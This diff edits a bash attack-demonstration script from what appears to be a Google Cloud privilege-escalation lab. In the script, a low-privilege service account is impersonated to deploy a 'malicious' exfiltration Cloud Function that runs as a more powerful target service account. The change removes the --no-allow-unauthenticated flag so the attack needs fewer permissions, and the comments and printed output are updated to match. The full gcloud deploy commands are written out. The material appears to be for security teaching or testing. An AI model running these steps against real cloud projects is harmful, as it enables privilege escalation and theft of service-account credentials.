@@ -206,10 +206,15 @@ echo -e "${GREEN}✓ Built malicious function source (entry point: $ENTRY_POINT)
 # iam.serviceAccounts.actAs grant on target_sa is what lets
 # --service-account=target_sa succeed at all.
 #
-# gcloud mode: uses gcloud functions deploy — clear, shows the exact commands
-# an attacker would run. Requires cloudbuild.builds.get,
-# resourcemanager.projects.getIamPolicy, run.services.getIamPolicy, and
-# run.services.setIamPolicy in addition to the raw API minimums.
+# gcloud mode: uses gcloud functions deploy with --build-service-account,
+# which skips the Cloud Build default-SA lookup and project IAM validation.
+# The remaining gcloud-mechanic permissions beyond the raw API minimum are
+# cloudfunctions.functions.get (preflight) and resourcemanager.projects.get.
+# Note: --no-allow-unauthenticated is deliberately NOT passed — that flag
+# makes gcloud verify/set the Cloud Run invoker policy (run.services.getIamPolicy
+# / setIamPolicy) after the deploy, permissions starting_sa does not hold. A
+# gen2 function created via the API defaults to restricted (authenticated-only)
+# access, so the exfil function is never public.
 #
 # --api-only mode: uses the Cloud Functions v2 REST API directly via curl.
 # Requires only functions.create + sourceCodeSet + actAs — no Cloud Build or
@@ -229,7 +234,7 @@ if $USE_GCLOUD; then
     # cloudfunctions.functions.get), since the deploy response includes serviceConfig.uri.
     # gcloud deploy handles create-vs-update automatically; no pre-check needed.
     show_attack_cmd "$STARTING_SA_EMAIL" \
-        "gcloud functions deploy $FUNCTION_NAME --gen2 --runtime=python312 --region=$REGION --source=$BUILD_DIR/src --entry-point=$ENTRY_POINT --trigger-http --service-account=$TARGET_SA_EMAIL --build-service-account=projects/$PROJECT_ID/serviceAccounts/$TARGET_SA_EMAIL --no-allow-unauthenticated --impersonate-service-account=$STARTING_SA_EMAIL"
+        "gcloud functions deploy $FUNCTION_NAME --gen2 --runtime=python312 --region=$REGION --source=$BUILD_DIR/src --entry-point=$ENTRY_POINT --trigger-http --service-account=$TARGET_SA_EMAIL --build-service-account=projects/$PROJECT_ID/serviceAccounts/$TARGET_SA_EMAIL --impersonate-service-account=$STARTING_SA_EMAIL"
 
     # Capture stdout (JSON) and stderr (warnings/progress) separately.
     # gcloud --format=json prints structured JSON to stdout and WARNING/progress
@@ -244,7 +249,6 @@ if $USE_GCLOUD; then
             --trigger-http \
             --service-account="$TARGET_SA_EMAIL" \
             --build-service-account="projects/${PROJECT_ID}/serviceAccounts/${TARGET_SA_EMAIL}" \
-            --no-allow-unauthenticated \
             --impersonate-service-account="$STARTING_SA_EMAIL" \
             --format=json 2>"$DEPLOY_STDERR_FILE")
     DEPLOY_EXIT=$?
@@ -561,7 +565,7 @@ if $USE_GCLOUD; then
     echo "  Permissions confirmed NOT needed (CF API handles IAM internally):"
     echo "    run.services.getIamPolicy, run.services.setIamPolicy"
     echo ""
-    echo "  These two mechanics are included in starting_sa's gcloud-mechanic role by Terraform."
+    echo "  These two mechanics are included in starting_sa's helpful role by Terraform."
     echo "  To see the attack with only the true minimum permissions, run:"
     echo -e "  ${CYAN}\$ ./demo_attack.sh --api-only${NC}"
 fi
